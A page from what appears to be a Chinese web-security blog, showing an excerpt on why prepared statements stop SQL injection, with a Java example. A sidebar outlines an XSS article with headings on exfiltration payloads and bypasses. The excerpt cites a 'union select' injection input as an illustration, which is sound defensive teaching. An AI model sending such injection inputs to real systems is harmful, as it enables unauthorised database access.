为什么预编译能防御SQL注入？假设有一个使用SQL预编译的查询语句： 12345String query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;PreparedStatement pstmt = connection.prepareStatement(query);pstmt.setString(1, username);pstmt.setString(2, password);ResultSet rs = pstmt.executeQuery();  在这个示例中，查询语句中的参数使用了占位符，即“?”号，而不是将参数直接拼接到SQL语句中。这可以有效地防止SQL注入攻击。 SQL注入的核心原因在于：数据库将用户的输入当成了可执行的SQL代码的一部分。 普通查询：直接拼接字符串。如果用户输入 1 union select...，数据库会将其解析为两条指令。 预编译...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Echoin</div><div class="author-info-description">Web安全 · 渗透测试 · CTF · 靶场</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Echoin-613"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Echoin-613" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #8b7cf6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的安全博客，一起学习 Web 安全与渗透测试！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%AC%E8%B4%A8"><span class="toc-number">1.</span> <span class="toc-text">1. 一句话本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81%EF%BC%88%E7%9C%8B%E5%88%B0-%E6%9C%89%E6%B4%9E%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">2. 代码特征（看到&#x3D;有洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81-A%EF%BC%9A%E5%90%8E%E7%AB%AF%E8%BE%93%E5%87%BA%E5%88%B0-HTML-%E6%B2%A1%E8%BD%AC%E4%B9%89"><span class="toc-number">2.1.</span> <span class="toc-text">特征 A：后端输出到 HTML 没转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81-B%EF%BC%9A%E5%89%8D%E7%AB%AF%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%A1%9E%E8%BF%9B%E3%80%8C%E8%83%BD%E6%89%A7%E8%A1%8C-%E8%83%BD%E8%A7%A3%E6%9E%90-HTML%E3%80%8D%E7%9A%84-API"><span class="toc-number">2.2.</span> <span class="toc-text">特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81-C%EF%BC%9A%E4%B8%89%E4%B8%AA%E5%8A%A9%E6%8E%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text">特征 C：三个助推漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E6%98%93%E6%BC%8F%E7%9A%84-sink"><span class="toc-number">2.4.</span> <span class="toc-text">容易漏的 sink</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AE%A1%E8%AE%A1%E8%B7%AF%E5%BE%84%EF%BC%88source%E2%86%92sink%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3. 审计路径（source→sink）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%99%BD%E7%9B%92%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">4. 白盒验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E9%BB%91%E7%9B%92%E9%AA%8C%E8%AF%81"><span class="toc-number">5.</span> <span class="toc-text">5. 黑盒验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8%E4%B8%8E%E6%89%93%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">6. 利用与打法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Payload-%E6%A8%A1%E6%9D%BF"><span class="toc-number">7.</span> <span class="toc-text">7. Payload 模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%A4%96%E5%B8%A6%EF%BC%88%E4%B8%80%E6%AD%A5%EF%BC%89"><span class="toc-number">7.1.</span> <span class="toc-text">通用外带（一步）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%A4%96%E5%B8%A6%EF%BC%88%E4%B8%A4%E6%AD%A5%EF%BC%9A%E5%85%88%E6%8B%BF-ID-%E5%86%8D%E8%AF%BB%E8%AF%A6%E6%83%85%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">通用外带（两步：先拿 ID 再读详情）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E5%A4%9A%E4%B8%AA-ID"><span class="toc-number">7.3.</span> <span class="toc-text">遍历多个 ID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%98%E4%BD%93"><span class="toc-number">7.4.</span> <span class="toc-text">读什么数据的变体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">7.5.</span> <span class="toc-text">注入点特殊情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%91%E5%90%AC"><span class="toc-number">7.6.</span> <span class="toc-text">服务器监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">8. 绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/kerberos-bronze-bit/" title="攻击方式 - Kerberos Bronze Bit">攻击方式 - Kerberos Bronze Bit</a><time datetime="2026-08-14T08:00:00.000Z" title="发表于 2026-08-14 16:00:00">2026-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/kerberoasting/" title="攻击方式 - Kerberoasting">攻击方式 - Kerberoasting</a><time datetime="2026-08-14T07:30:00.000Z" title="发表于 2026-08-14 15:30:00">2026-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/as-rep-roasting/" title="攻击方式 - AS-REP Roasting">攻击方式 - AS-REP Roasting</a><time datetime="2026-08-14T07:00:00.000Z" title="发表于 2026-08-14 15:00:00">2026-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/http-request-smuggling/" title="HTTP 请求走私">HTTP 请求走私</a><time datetime="2026-08-14T06:30:00.000Z" title="发表于 2026-08-14 14:30:00">2026-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/xss/" title="XSS 跨站脚本攻击">XSS 跨站脚本攻击</a><time datetime="2026-08-14T06:00:00.000Z" title="发表于 2026-08-14 14:00:00">2026-08-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Echoin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script src="/js/cursor.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="/pluginsSrc/butterfly-extsrc/dist/fireworks.min.js?v=1.1.6"></script><script id="canvas_nest" defer="defer" color="167,139,250" opacity="0.6" zIndex="-1" count="99" mobile="false" src="/pluginsSrc/butterfly-extsrc/dist/canvas-nest.min.js?v=1.1.6"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
